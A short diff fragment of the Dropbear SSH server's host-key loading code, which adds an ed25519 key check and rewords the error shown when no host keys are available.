-	disablekey(DROPBEAR_SIGNATURE_SK_ED25519);
+    if (svr_opts.hostkey->ed25519key) {
+        any_keys = 1;
+    }
 #endif
 
-	if (!any_keys) {
-		dropbear_exit("No hostkeys available. 'dropbear -R' may be useful or run dropbearkey.");
-	}
+    if (!any_keys) {
+        dropbear_exit("No hostkeys available. Use -R to generate them or enable in-memory keys.");
+    }
 }
 
 static void load_banner() {
